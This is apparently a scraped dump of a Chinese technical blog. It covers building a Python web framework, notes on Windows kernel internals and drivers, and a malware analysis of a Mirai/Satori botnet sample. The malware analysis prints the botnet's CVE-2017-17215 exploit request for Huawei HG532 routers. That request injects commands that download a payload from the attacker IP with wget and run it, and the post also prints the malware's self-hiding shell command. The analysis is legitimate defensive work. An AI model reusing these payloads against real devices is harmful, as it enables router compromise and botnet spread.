2*4 #前置长度 self.data[&quot;file&quot;] = self.raw_data.split(boundary)[1][pre_len:-2] self.data[&quot;len&quot;] = len(self.data[&quot;file&quot;]) 由于使用了epoll模型，当上传的数据长度小于总长度时继续上传，完成后再进行处理，那么server就会有如下修改 数据可读时继续读取客户端发送过来的数据 12345678elif event &amp; select.EPOLLIN: # 有数据可读 try: data = b&quot;&quot; data = connections[fileno].recv(1024*1024*10) # print(&quot;data from server\\n&quot;,data) if data: requests[fileno] += data 由于我的epoll对每个发送过来的package都有一个response，所以需要修改 123456789101112131415161718192021# 处理请求并生成响应for fileno, data in requests.items(): if b&quot;HTTP&quot; in data or b&quot;http&quot; in data: # 解析请求头部 http = HTTPRequest(data=data, fileno=fileno, connections=connections) if http.cur_len &lt; http.length: pass else: http.show() http_route = HTTPRouter(http) response = http_route.route() responses[fileno] = response connections[fileno].send(response) # 构造响应头部和内容 # 清空请求缓冲区 response = b&#x27;&#x27; data = b&#x27;&#x27; requests[fileno] = b&#x27;&#x27; 然后测试了下效率，面对小文件的时候效率还说得过去（&lt;10MB），大文件的话又是使用的是对应fd的data进行拼接，增大了内存开销和CPU开销（不知道使用c的指针会不会快一些），这也是后续需要优化的东西 更大的文件后面会出现指数级下降，不过这里也可以看出来基于TCP的拥塞控制，单次发包最大为128kb，分块传输，后续可以针对这些特性进行改进。 6-6 重定向 12345@http_apidef redirect(http_request): data= &quot;http://www.qq.com&quot; result = Response(reply=data,type=&quot;text&quot;,status_code=302) return result.consum() 主要就是通过302跳转进行重定向，然后在返回报文哪里设置了几个新的参数 12345678910111213141516171819202122def consum(self) -&gt; bytes: result = &quot;&quot; if self.status_code == 302: result += &quot;HTTP/1.1 &#123;status_code&#125; &#123;msg&#125;\\r\\nLocation: &#123;location&#125;\\r\\n\\r\\n&quot;.format( status_code=self.status_code, msg=status_code_dict[self.status_code], location=self.reply) else: result += &quot;HTTP/1.1 &#123;status_code&#125; &#123;msg&#125;\\r\\n&quot;.format( status_code=self.status_code, msg=status_code_dict[self.status_code]) result += &quot;Content-Type: &#123;type&#125;\\r\\n&quot;.format( type = self.content_type) result += &quot;Content-Length: &#123;length&#125;\\r\\n&quot;.format( length=self.length) result += &quot;\\r\\n&quot; result = result.encode() if self.status_code == 302: pass else: if type(self.reply) == bytes: result += self.reply else: result += self.reply.encode() return result 之后可以在utils里面打包这些方法，我这里放在http_response下面 12345# 重定向def redirect(http_url): data= str(http_url) result = Response(reply=data,type=&quot;text&quot;,status_code=302) return result.consum()","categories":[{"name":"program","slug":"program","permalink":"https://joe1sn.eu.org/categories/program/"}],"tags":[{"name":"muud","slug":"muud","permalink":"https://joe1sn.eu.org/tags/muud/"},{"name":"web framework","slug":"web-framework","permalink":"https://joe1sn.eu.org/tags/web-framework/"}]},{"title":"【Muud开发】1.基础结构解析","slug":"web-0x1","date":"2023-05-31T17:43:18.000Z","updated":"2023-06-01T14:31:23.538Z","comments":true,"path":"2023/06/01/web-0x1/","link":"","permalink":"https://joe1sn.eu.org/2023/06/01/web-0x1/","excerpt":"从0到1开发一个勉强能用的python web“框架” 项目地址：https://github.com/Joe1sn/muud","text":"从0到1开发一个勉强能用的python web“框架” 项目地址：https://github.com/Joe1sn/muud 简单介绍 ​ 在毕业设计的时候，初始选题为《基于XMPP的即时通讯系统》，想的是自己照着RFC写一遍XMPP协议，但是时间不够（毕竟要上班）。所以把废案再利用，抽出其中的一些部分，从Socket到web框架，实现一个简单的CURD功能，锻炼一下自己的文档化编程能力。受我个人能力有限会随时断更，一路上只有vscode和chatGPT以及所需要的RFC文档。 ​ 再说说已实现的部分，首先是确定在Linux上运行的，使用python语言 使用epoll模型完成了部分HTTP服务器的功能 sqlalchemy完成了数据库的ORM实现 路由通过闭包完成 视图部分编写（只考虑JSON传递） 启动部分参考了Django的设计 最后运行的效果 需求分析 根据ChatGPT，一个典型的Python Web框架通常由以下几个核心组件组成： 路由（Routing）：路由用于将传入的HTTP请求映射到相应的处理程序或视图函数上。它确定了不同URL路径与应用程序中的不同功能点之间的关联关系。 视图（Views）：视图是处理HTTP请求并生成HTTP响应的函数或方法。它们接收来自路由的请求并执行相应的逻辑，最后返回响应给客户端。 模板引擎（Template Engine）：模板引擎允许开发者将静态模板和动态数据结合，生成最终的HTML响应。模板引擎通常支持模板语法、变量替换、条件判断、循环等功能，以简化动态内容的生成。 中间件（Middleware）：中间件是位于请求和视图之间的组件，用于在请求到达视图之前或响应返回客户端之前执行一些通用的功能。中间件可以处理身份验证、请求预处理、错误处理等任务。 数据库访问（Database Access）：Web框架通常提供了对数据库的支持，以便应用程序可以与数据库进行交互。这包括连接数据库、执行查询和操作、ORM（对象关系映射）等功能。 表单处理（Form Handling）：Web应用程序通常需要处理用户提交的表单数据。框架提供了表单验证、数据绑定、错误处理等功能，使开发者可以方便地处理表单数据。 身份验证与授权（Authentication and Authorization）：身份验证用于验证用户的身份，而授权则用于确定用户是否有权限执行特定操作。框架通常提供了身份验证和授权的支持，以便开发者可以轻松实现用户认证和授权功能。 测试框架（Testing Framework）：测试框架用于编写和执行自动化测试，以确保应用程序的正确性和稳定性。它提供了测试用例的编写、运行和断言等功能。 后来的项目像参考Django的设计 目前项目缺少的： 模板渲染：设计的时候考虑到前后端分离是开发，没有想过渲染 中间件：完全没有设计 表单处理：完全没有设计 测试框架：还在学 对于Django这样的框架来说，开启一个项目后， 123456789101112131415161718.├── 开启的app名称│ ├── admin.py│ ├── apps.py│ ├── __init__.py│ ├── migrations│ ├── models.py│ ├── tests.py│ └── views.py├── 项目名称│ ├── asgi.py│ ├── __init__.py│ ├── settings.py│ ├── urls.py│ └── wsgi.py├── manage.py├── static└── templates views.py是视图、models.py是ORM对象、asgi.py\\wsgi.py是HTTP服务、setting.py是设置、url.py是路由，项目从manage,py开始，那么就可以整理一下原来的代码了。 那么目前项目的结构 1234567891011121314151617181920212223├── config│ ├── client.conf│ ├── database.conf │ ├── server.conf│ ├── server.crt│ ├── server.csr│ └── server.key├── manage.py├── README.md├── requirements.txt├── rprint.py├── server│ ├── db.py│ ├── models.py │ ├── serialization.py│ ├── server.py│ ├── urls.py│ ├── utils│ │ ├── autoreload.py│ │ ├── epollcontrol.py│ │ ├── functional.py│ └── views.py└── test config 包含数据库配置(database.conf)，SSL使用的证书(server.csr)和key(server.key)，socket服务配置(server.conf) utils 一些帮助模块 server 主要功能实现，包括路由、epoll管理、数据库相关，其中views.py可以编写api，urls.py中设置路由 test 一些测试用例 目前应该专注于第一块：优化epoll性能以及wsgi、asgi的实现。","categories":[{"name":"program","slug":"program","permalink":"https://joe1sn.eu.org/categories/program/"}],"tags":[{"name":"muud","slug":"muud","permalink":"https://joe1sn.eu.org/tags/muud/"},{"name":"web framework","slug":"web-framework","permalink":"https://joe1sn.eu.org/tags/web-framework/"}]},{"title":"【win内核原理与实现】I. Windows系统结构","slug":"windows-kernel-1-baisc","date":"2023-05-24T03:28:39.000Z","updated":"2023-06-01T14:31:05.149Z","comments":true,"path":"2023/05/24/windows-kernel-1-baisc/","link":"","permalink":"https://joe1sn.eu.org/2023/05/24/windows-kernel-1-baisc/","excerpt":"Windows系统结构还有引导过程","text":"Windows系统结构还有引导过程 I.a 大致结构 windows内核是从windows NT内核发展过来的，从开始就和硬件的发展息息相关。 Windows采用双模式（dual mode）结构来保护操作系统内核不受应用程序的错误而出现崩溃 windows的原始设计是一个支持多环境子系统的os，它还支持POSIX和OS/2环境子系统.为他们提供仿真执行环境 I.b windows内核组成结构 关于函数的开头 nt：内核提供的服务 Ldr：映像加载器函数 Csr：Windows子进程通讯函数 Dbg：调试函数 Etw：系统时间函数 Rtl：运行支持函数 执行体API函数接收的参数来自各种应用程序，通常会在程序的最开始处，对所接受的参数逐一探查他们的可访问性。 II. windows内核关键组件 HAL 硬件抽象层 HAL通常是一个独立的动态链接库，windows自身携带多种HAL，但是在系统安装的时候只会选择一种，改名为hal.dll。涉及中断控制器、单处理器/多处理器硬件断点。 内核（微内核） 在内核模块ntoskrnl.exe中的上层部分为执行体，下层最接近HAL的就是内核。负责进程调度、中断和异常处理，核心任务是尽可能让系统中的所有处理器变得高效。 windows内核使用抢占式调度，由于采用面向对象的设计，使得它主要面向两个对象：分发器 和 控制 两个对象 分发器对象：实现各种同步功能。影响线程调度，主要用于 事件(event) 突变体(mutant) 信号量(semaphore) 进程(process) 线程(thread) 队列(query) 门(gate) 定时器(timer) 控制对象：用于控制内核的操作，不影响线程调度。包括 异步调用(APC) 延迟过程调用(DPC) 中断对象 执行体 在内核模块ntoskrnl.exe中的上层部分，包含5种类型的函数 被导出的、可以在用户模式下调用的函数。位于 ntdll.dll 中。一般就是win API 没有被导出、可以在用户模式下调用的函数。比如常见的反调试函数，包括各种LRC(Local Process Call，本地调用过程)、各种查询函数和专业函数。 只能在内核模式下调用的导出函数。在windows DDK中有文档。 执行体之间内部调用，未被文档化的函数 一个组件的内置函数 其中组件包括 进程和线程管理器：负责进程/线程的CURD 内存管理：虚拟内存 安全引用监视器（SRM）：维护本地计算机的安全策略 I/O管理器 缓存管理器：允许磁盘将文件映射到内存中 配置管理器：负责注册表的实现 即插即用管理器 还有的函数负责对执行体进行管理 对象管理器：执行体对象的CURD LPC设施：负责同一设备的的客户进程和服务进程的消息传递，对应的是远程过程调用（RPC） 运行时库函数 执行体支持例程：内存的分配、互锁内存的转换 设备驱动程序 驱动文件（.sys），漏洞挖掘存在于IOCTL 文件系统/存储管理 主要是ntfs.sys。漏洞挖掘存在于CLFS（通用日志文件系统）。 网络 windows套接字、winInet、NetBIOS、RPC III. windows子系统 在上面的内核部分已经实现了对硬件的简单访问控制，那么就会在次基础上进行跟高层次的建设。 在PE文件的头部域Subssytem中指定了该程序会在那个子环境中运行。 子系统也分为用户模式和内核模式，核心部分是 win32k.sys。子系统的DLL链接到应用程序中，包括kernel32.dll user32.dll gdi32.dll advapi.dll，负责实现文档化的windows函数。 win32k.sys同时也负责向内核注入一系列出调函数(callout)，一旦调用了win32k.sys的任何一个系统服务，这个程序就会变成一个GDI线程 核心功能可以分为： 窗口管理 由windows子进程csrss.exe负责控制台窗口功能 1234子系统会话---&gt;交互式窗口站---&gt;默认桌面---&gt;顶级窗户口列表-&gt;子窗口 | |_&gt;登录窗口 | |_&gt;屏幕保护窗口 |-&gt;非交互式窗口--&gt;不可见桌面 图形设备接口(GDI) 主要是图形支持，设计Direct3D等 IV. 安全性管理 三个核心组件：winlogon、SRM 和 lsass winlogon 和 lsass 是两个用户模式进程， 而 SRM 是 Windows 执行体中的组件 SRM（Security Reference Monitor安全引用监视器），负责执行对象的安全访问检查、管理用户特权、生成安 全审计消息，并且定义了访问令牌数据结构来表示一个安全环境。 Winlogon，负责响应 SAS（安全注意序列），以及管理交互式登录会话。当用户登 录到系统中时，winlogon 创建一个初始进程，并进一步由它创建外壳（shell）进程。 Lsass（Local Security Authentic SubSystem本地安全权威子系统），负责本地系统的安全策略，同时，它也认证用户的 身份，以及将安全审计消息发送到系统的事件日志中。 SAM（安全账户管理器）数据库，包含了本地用户和用户组，以及它们的口令和其 他属性。它位于注册表的 HKLM\\SAM 下面。由于 HKLM\\SAM 键只允许本地系统账 户访问，所以，除非用户在 Local System 账户下运行 regedit.exe 工具，否则无法访问 HKLM\\SAM 子树。 LSA 策略数据库，包含了有关当前系统的一些信息，譬如谁允许访问系统以及如何 访问（交互式登录、网络登录或者以服务方式登录）；分配给谁哪些特权；安全审计 如何进行等。如同 SAM 数据库一样，LSA 策略数据库也存储在注册表中，位于 HKLM\\SECURITY 下面。同样地，除了 Local System 账户以外的其他账户均无法访 问 HKLM\\SECURITY 子树。 winlogon 负责系统登录，包括对用户身份的认证；lsass 负责管理系统本地安全策略，并且将这些策略通知到内核中的 SRM。在内核 中，SRM 负责实现基于对象的访问控制以及系统全局安全策略的实施。 关于一些提权 在 Windows 中，特权是由 LUID 对象来标识的，LUID 代表一个本地唯一标识符（Locally Unique Identifier） 12345678typedef struct _LUID_AND_ATTRIBUTES &#123; LUID Luid; ULONG Attributes; &#125; LUID_AND_ATTRIBUTES, * PLUID_AND_ATTRIBUTES; #define SE_PRIVILEGE_ENABLED_BY_DEFAULT (0x00000001L) #define SE_PRIVILEGE_ENABLED (0x00000002L) #define SE_PRIVILEGE_REMOVED (0X00000004L) #define SE_PRIVILEGE_USED_FOR_ACCESS (0x80000000L) Windows 内核中定义了一组特权，即类型为 LUID 的 Se全局变量。Windows 内核中，与安全相关的函数以“Se”作为前缀，有一些安全函数还存在对应的系 统服务。这些系统服务函数的名称以“Nt”作为前缀，后面部分与“Se”函数相同。 V. Windows的引导过程 最开始也是从经典的MBR开始，然后是ntldr的osloader。 在osloader中将物理地址转为虚拟地址，该过程可见：windows_kernel_driver_2中对CR3、CR4寄存器的控制。 之后osloader加载NTDETECT.COM程序，利用系统BIOS查询系统基本设备，在引导过程的后期被存放到注册表 HKLM\\HARDWARE\\DESCRIPTION os loader 加载内核模块映像文件，默认为 ntoskrnl.exe，以及 HAL 映像文件，默 认为 hal.dll。再加载注册表的 SYSTEM 储巢，即\\WINDOWS\\system32\\config\\system 文件。 然后是内核的初始化，此入口函数为 KiSystemStartup 为了解决在初始化过程中的相互依赖 性问题，内核的初始化分两个阶段进行，称为阶段 0 和阶段 1。大多数内核组件的初始化函 数相应地带有一个整数参数，以指明一次调用是阶段 0 初始化还是阶段 1 初始化，而有些组 件的初始化函数通过检查一个全局变量 InitializationPhase 的值来判断当前处于哪个阶段。 阶段 0 初始化的目的是，将阶段 1 初始化所要用到的基 本数据结构建立起来。这时中断被禁止，调整IDT、TSS、PCR等。接着调用 KiInitializeKernel 函数，执行内核初始化。最后，当前线程蜕变成一个空闲线程。 V. Windows发布历史 MicroSoft在操作系统领域中最开始起源于MS-DOS，随后演变出了两个分支，最开始的Win 95/98/Me，之后就是基于Windows NT的内核版本的Window XP/7/8/10/vista的版本。 版本 发布日期 主要特点 内核版本 Windows 1.0 1985年11月 初始版本，提供基本的图形用户界面和应用程序支持 1.0 Windows 2.0 1987年12月 引入了窗口重叠、图标和键盘快捷键等改进 2.0 Windows 3.0 1990年5月 支持多任务处理和TrueType字体，用户界面大幅改进 3.0 Windows 95 1995年8月 具有开始菜单、任务栏和32位应用程序支持的重要版本 4.0 Windows 98 1998年6月 引入了对USB设备和DVD光盘的支持，改进了系统稳定性 4.10 Windows 2000 2000年2月 强化了系统稳定性和安全性，提供了企业级特性 5.0 Windows XP 2001年10月 引入了全新的用户界面、系统恢复功能和多用户支持 5.1 Windows Vista 2007年1月 全新的用户界面、更高的安全性和系统稳定性 6.0 Windows 7 2009年10月 优化了用户界面和性能，改进了任务栏和窗口管理 6.1 Windows 8 2012年10月 引入了全新的开始屏幕和触摸优化的用户界面 6.2 Windows 10 2015年7月 统一了桌面和移动设备平台，引入了Windows应用商店 10.0 Windows 11 2021年10月 新的用户界面设计、改进的性能和安全性，支持Android应用 10.0","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"kernel","slug":"notes/kernel","permalink":"https://joe1sn.eu.org/categories/notes/kernel/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"}]},{"title":"Mirai Botnet分支Satori分析","slug":"mirai-bota","date":"2023-03-25T10:42:45.000Z","updated":"2023-06-01T14:29:56.735Z","comments":true,"path":"2023/03/25/mirai-bota/","link":"","permalink":"https://joe1sn.eu.org/2023/03/25/mirai-bota/","excerpt":"暂时先更新这么多，后面应该还有相关作者被抓的一些消息和更多功能的逆向","text":"暂时先更新这么多，后面应该还有相关作者被抓的一些消息和更多功能的逆向 基本情况 名称 x86_64 MD5 fe7ca3b588e342f79c7814bb75dc24d7 SHA256 e436196f047741070c580695f5444e0c2cdd175c88f68affdc9230d09a71c978 Domain botnet.nguyennghi.info ip 103.183.118.73 逆向分析 基本情况 64位ELF可执行文件 逆向工程 通过start找到main函数 使用IDApython脚本对类似的库函数实现进行函数重命名 1234567891011121314151617181920import idautilsimport idaapiimport ida_nameimport idcfor func_ea in idautils.Functions(): func = idaapi.get_func(func_ea) name = idaapi.get_func_name(func_ea) for head in idautils.Heads(func.start_ea, func.end_ea): try: code = idc.GetDisasm(head) if &quot;syscall&quot; in code: print(&quot;Function: &#123;&#125;&quot;.format(name).ljust(0x40,&#x27;-&#x27;)) print(code[21:].ljust(0x30,&quot;=&quot;)) ida_name.set_name(func.start_ea, code[21:]) idc.set_func_flags(func.start_ea, idc.get_func_flags(func_ea) | idaapi.FUNC_LIB) except: pass main函数 首先创建向8.8.8.8:13568的socket连接，通过getsockname测试网络是否连通并获得本机ip地址 初始化加密消息 由于使用未知版本的lib库进行静态编译，所以需要手动识别一些lib函数。 比如这里使用malloc分配并将密文使用strncpy将消息复制到堆中 利用pid和随机数进行随机数生成，对进程进行随机改名 将time生成的伪随机数和pid进行异或等操作得到随机数 通过位移等操作实现随机数的范围控制 在之后使用ptrcl进行进程的重命名 拼接指令过后，修改相关信号变量值，并在vfork的execl中执行 拼接命令字符串 设置信号量并使用vfork执行 vfork部分 执行的语句为 1/bin/sh sh -c rm -rf $root_random_name &amp;&amp; mkdir bin; &gt; $cur_random_name &amp;&amp; mv $pwd $root_random_name ; chmod 777 $root_random_name 例如 1/bin/sh sh -c rm -rf bin/watchdog &amp;&amp; mkdir bin \\336\\377\\377\\377\\177; &gt;bin/watchdog &amp;&amp; mv /home/test/Desktop/HackedByAlan/check/mirai bin/watchdog; chmod 777 bin/watchdog 随机选择 &quot;/bin/busybox&quot;;、&quot;/bin/watchdog&quot;、&quot;/bin/systemd&quot;中的一个（$root_random_name）中的一个删除 当前文件夹创建bin目录 将当前目录下的病毒移动至创建的bin目录中，并重命名$root_random_name 给予bin/$root_random_name最高权限 通过多次运行可以成功实现，如果&amp;&amp; mkdir bin \\336\\377\\377\\377\\177中没有乱码，那么就会执行后一句 使用异或解密字符串并打印，完成后加密字符串 过程 利用其自身的解密脚本，可以解密所有密文 1234567891011121314151617181920212223242526str1 = [ 0x4C, 0x41, 0x5A, 0x40, 0x4B, 0x5A, 0x00, 0x40, 0x49, 0x5B, 0x57, 0x4B, 0x40, 0x40, 0x49, 0x46, 0x47, 0x00, 0x47, 0x40, 0x48, 0x41, 0x2E]str2 = [0x4A, 0x41, 0x40, 0x4B]str3 = [0x01, 0x5E, 0x5C, 0x41, 0x4D, 0x01, 0x2E]str4 = [0x01, 0x4B, 0x56, 0x4B, 0x2E]str5 = [0x01, 0x48, 0x4A, 0x2E]str6 = [0x01, 0x4D, 0x43, 0x4A, 0x42, 0x47, 0x40, 0x4B, 0x2E]key = 0x6D53D2C2def decrypt(cipher:list): v3 = key &amp; 0xFF v4 = key &gt;&gt; 8 v5 = (key &gt;&gt; 16) &amp; 0xFFFF v6 = (key &gt;&gt; 24) &amp; 0xFF result = &quot;&quot; for i in cipher: result += chr((i^v3^v4^v5^v6 )&amp; 0xFF) return resultif __name__ == &#x27;__main__&#x27;: print(&quot;1&quot;, decrypt(str1)) print(&quot;2&quot;, decrypt(str2)) print(&quot;3&quot;, decrypt(str3)) print(&quot;4&quot;, decrypt(str4)) print(&quot;5&quot;, decrypt(str5)) print(&quot;6&quot;, decrypt(str6)) 加密字符串，由于是异或加密，所以加解密算法一致 合适函数表，讲函数放到一个table中 使用fork获得子进程，打开/proc文件夹并读取其中的文件，关闭除必要进程外的所有进程 打开/proc/文件夹 关闭除必要进程外的所有进程 使用SSDP协议进行网络发包，使用华为HG532远程命令执行漏洞（CVE-2017-17215）的payload进行发包，进行攻击 进行攻击 创建socket 设置 socket 选项，允许向组播地址发送数据 设置目标地址和端口号 构造 M-SEARCH 请求报文，发送搜索请求 payload分析 12345678910111213141516POST /ctrlt/DeviceUpgrade_1 HTTP/1.1Connection: keep-aliveAccept: */*Authorization: Digest username=&quot;dslf-config&quot;, realm=&quot;HuaweiHomeGateway&quot;, nonce=&quot;88645cefb1f9ede0e336e3569d75ee30&quot;, uri=&quot;/ctrlt/DeviceUpgrade_1&quot;, response=&quot;3612f843a42db38f48f59d2a3597e19c&quot;, algorithm=&quot;MD5&quot;, qop=&quot;auth&quot;, nc=00000001, cnonce=&quot;248d1a2560100669&quot;Content-Length: 457&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt; &lt;s:Body&gt; &lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt; &lt;NewStatusURL&gt;$(/bin/busybox wget -g 103.183.118.73 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)&lt;/NewStatusURL&gt; &lt;NewDownloadURL&gt;$(echo HUAWEIUPNP)&lt;/NewDownloadURL&gt; &lt;/u:Upgrade&gt; &lt;/s:Body&gt;&lt;/s:Envelope&gt; 核心语句 /bin/busybox wget -g 103.183.118.73 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei 网络连接相关 DNS SERVER anuj.ns.cloudflare.com. 173.245.59.65 anuj.ns.cloudflare.com CLOUDFLARENET United States raphaela.ns.cloudflare.com. 108.162.194.192 raphaela.ns.cloudflare.com CLOUDFLARENET United States Host Records (A) nguyennghi.info HTTP: cloudflare 104.21.78.122 CLOUDFLARENET unknown antiddos.nguyennghi.info 103.161.181.140 DVS-AS-VN VIET DIGITAL TECHNOLOGY LIABILITY COMPANY Vietnam checkht4gvpn.nguyennghi.info HTTP: cloudflare 172.67.220.248 CLOUDFLARENET United States","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/tags/notes/"},{"name":"git","slug":"git","permalink":"https://joe1sn.eu.org/tags/git/"}]},{"title":"windows内核驱动 2-页表探索","slug":"windows_kernel_driver_2","date":"2023-02-17T07:21:36.000Z","updated":"2023-06-01T14:36:31.026Z","comments":true,"path":"2023/02/17/windows_kernel_driver_2/","link":"","permalink":"https://joe1sn.eu.org/2023/02/17/windows_kernel_driver_2/","excerpt":"探索CR4 探索页面 CR3寄存器于页遍历 虚拟地址-&gt;物理地址","text":"探索CR4 探索页面 CR3寄存器于页遍历 虚拟地址-&gt;物理地址 [驱动开发]探索CR4 英特尔® 64 位和 IA-32 架构开发人员手册合订本 第3卷第四章第五小节《4-LEVEL PAGING AND 5-LEVEL PAGING》 判断CPU是四级分页还是五级分页 page: 3074 该寄存器的值决定了映射层级是4/5， 1：5级分页 0：4级分页 12345678//__readcr4() &amp; 0x1000//__readcr4() &amp; (1&lt;&lt;12)CR4 Cr4 = &#123; .Value = __readcr4() &#125;;DbgPrint(&quot;CR4=0x%016I64X, CR4.LA57=%I64d\\n&quot;, Cr4.Value, Cr4.Fields.LA57);if (Cr4.Fields.LA57) DbgPrint(&quot;The system using 5 Level Paging&quot;);else DbgPrint(&quot;The system using 4 Level Paging&quot;); [驱动开发]探索页面 CR3寄存器于页遍历 CR3 寄存器设计 CR3[512][512][512][512] 个人觉得这块儿和CSAPP上面讲的差不多 页号=页首地址页大小=页首地址4KB==页首地址212==页首地址&gt;&gt;12页号 = \\frac{页首地址}{页大小}= \\frac{页首地址}{4KB}== \\frac{页首地址}{2^{12}}== 页首地址&gt;&gt;12页号=页大小页首地址​=4KB页首地址​==212页首地址​==页首地址&gt;&gt;12 12345678910111213//1.得到CR3寄存器的值，从而得到一级页表地址CR3 Cr3 = &#123; .Value = __readcr3() &#125;;//2.对每一个一级页读取PL1PTE L1pt = MmGetVirtualForPhysical(L1ptPa.AsLargeInteger);for (int n1 = 0; n1 &lt; 512; n1++) &#123; if (!L1pt[n1].Fields.P || !L1pt[n1].Fields.U_S) continue; PA L2ptPa = &#123; .Fields4KB.PPN = L1pt[n1].Fields.PPN &#125;; DbgPrint(&quot;...&quot;); //3.得到二级页表地址 PL2PTE L2pt = MmGetVirtualForPhysical(L2ptPa.AsLargeInteger); //4.类似嵌套循环，遍历 CR3的PPN是第12位，共40bit，所以一级页表是这个值。CR3的尾12位没有用全为0，同时24=162^{4} = 1624=16，那么向右移12位等效于16禁止右移124=3\\frac{12}{4}=3412​=3位 得到Level_1_PageTable的值过后，可以使用函数MmGetVirtualForPhysical获得该内存地址的值，从而遍历一级页表。要判断当前L1pt.P是否有效，同时L1pt.U_S可以判断该页的权限，详细可以看开发者手册 Table 4-20 依次循环可以遍历完整个内存页（下图中L4pt放不下了） 虚拟地址-&gt;物理地址 程序按照4KB分页个数太多不利于实验，可以强制将其分页为1GB，这样便于翻译 编写一个测试程序，该程序能申请出一页的内存，并打印其值 使用PsGetCurrentProcess获得当前进程PROCESS对象，若相等则不启用新方法 使用KeStackAttachProcess附加到要翻译的内存的PROCESS对象中，使用老方法输出就OK了，最后KeUnstackDetachProcess脱离 ?如何使用按照名字查找进程 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &quot;win10.h&quot;NTSTATUSQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID* SystemInformation)&#123; NTSTATUS Status; PVOID Buffer; ULONG BufferSize = 4096; do &#123; Buffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, BufferSize, &#x27;bisQ&#x27;); if (!Buffer) return STATUS_NO_MEMORY; Status = NtQuerySystemInformation(SystemInformationClass, Buffer, BufferSize, &amp;BufferSize); if (NT_SUCCESS(Status)) &#123; *SystemInformation = Buffer; return Status; &#125; ExFreePool(Buffer); if (STATUS_INFO_LENGTH_MISMATCH != Status) return Status; &#125; while (TRUE);&#125;NTSTATUSLookUpProcessByImageName(PCWSTR ImageName, PEPROCESS* Process)&#123; NTSTATUS Status; PSYSTEM_PROCESS_INFORMATION ProcessInformationArray = NULL; Status = QuerySystemInformation(SystemProcessInformation, &amp;ProcessInformationArray); if (!NT_SUCCESS(Status)) return Status; PSYSTEM_PROCESS_INFORMATION CurrentInformation = ProcessInformationArray; UNICODE_STRING ImageNameUnicodeString; RtlInitUnicodeString(&amp;ImageNameUnicodeString, ImageName); while (TRUE) &#123; if (RtlCompareUnicodeString(&amp;CurrentInformation-&gt;ImageName, &amp;ImageNameUnicodeString, FALSE) == 0) &#123; Status = PsLookupProcessByProcessId(CurrentInformation-&gt;UniqueProcessId, Process); ExFreePool(ProcessInformationArray); return Status; &#125; if (CurrentInformation-&gt;NextEntryOffset == 0) &#123; ExFreePool(ProcessInformationArray); return STATUS_NOT_FOUND; &#125; CurrentInformation = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)CurrentInformation + CurrentInformation-&gt;NextEntryOffset); &#125;&#125; 大致思路和win32下按名称查找PID差不多 具体过程 这里以0x00000254000003BC Str1 为例子，加载插件打印，耐心等待。。。 这时候的数据大小就有83KB了 format(0x00000254000003BC, &quot;064b&quot;)，内存前16位为空是没有用的 高9位 VPN1=4VPN1=4VPN1=4 int(format(0x00000254000003BC, &quot;064b&quot;)[16:][:9],2) 再9位 VPN2=336VPN2=336VPN2=336 int(format(0x00000254000003BC, &quot;064b&quot;)[16:][9:18],2) 该页表的PS=1，则不需要查找下一个页表了（而且后面也没有了） 得到的Pa就是物理页的首地址 + 剩余的30bit位作为VPO = 物理地址 hex(0x00000001C0000000+int(format(0x00000254000003BC, &quot;064b&quot;)[16:][18:],2)) 得到PA+VPO = 0x1c00003bc 暂停系统，Windbg -&gt; memory window -&gt; 右键 -&gt; proeries -&gt; physical memory 尝试修改 再次刷新应该就是1234了 成功修改 官方文档 2938/4834","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"kernel","slug":"notes/kernel","permalink":"https://joe1sn.eu.org/categories/notes/kernel/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"}]},{"title":"windows内核驱动 1-环境搭建","slug":"windows_kernel_driver_1","date":"2023-02-16T04:07:43.000Z","updated":"2023-06-01T14:33:58.629Z","comments":true,"path":"2023/02/16/windows_kernel_driver_1/","link":"","permalink":"https://joe1sn.eu.org/2023/02/16/windows_kernel_driver_1/","excerpt":"简而言之就是 visual stdio 2019 windows SDK windows WDK 如果vs没有kernel的项目的模板，找到vs目录的WDK.vsix即可","text":"简而言之就是 visual stdio 2019 windows SDK windows WDK 如果vs没有kernel的项目的模板，找到vs目录的WDK.vsix即可 关于调试 windbg调试器 同时windows 虚拟机我使用的是 vmware，添加了一个COM串口 加载驱动 使用KmdKit windows设置 msconfig -&gt; 调试 -&gt; COM2 … 最简单的hello world 打开vs，找到KMDF （kernel mode driver empty） 设置驱动项目 取消晚上12点后编译报错 项目 -&gt; 属性 -&gt; Inf2Cat -&gt; Use Local Time 代码 main.c 12345678910111213141516171819202122#include &lt;ntifs.h&gt;// 驱动卸载函数VOIDDriverUnload(PDRIVER_OBJECT DriverObject)&#123; UNREFERENCED_PARAMETER(DriverObject); DbgPrint(&quot;Bye\\n&quot;);&#125;// 驱动入口函数// System 在内核模式下运行该函数NTSTATUSDriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)&#123; UNREFERENCED_PARAMETER(RegistryPath); //宏防止编译器报错 DbgPrint(&quot;Hello World!\\n&quot;); //调式输出 DriverObject-&gt;DriverUnload = DriverUnload; //驱动卸载函数 return STATUS_SUCCESS; //加载成功返回码&#125; Class改为 Class=System ClassInstall32 直接删除两行（就是直接把这个属性删除了） 使用加载器加载 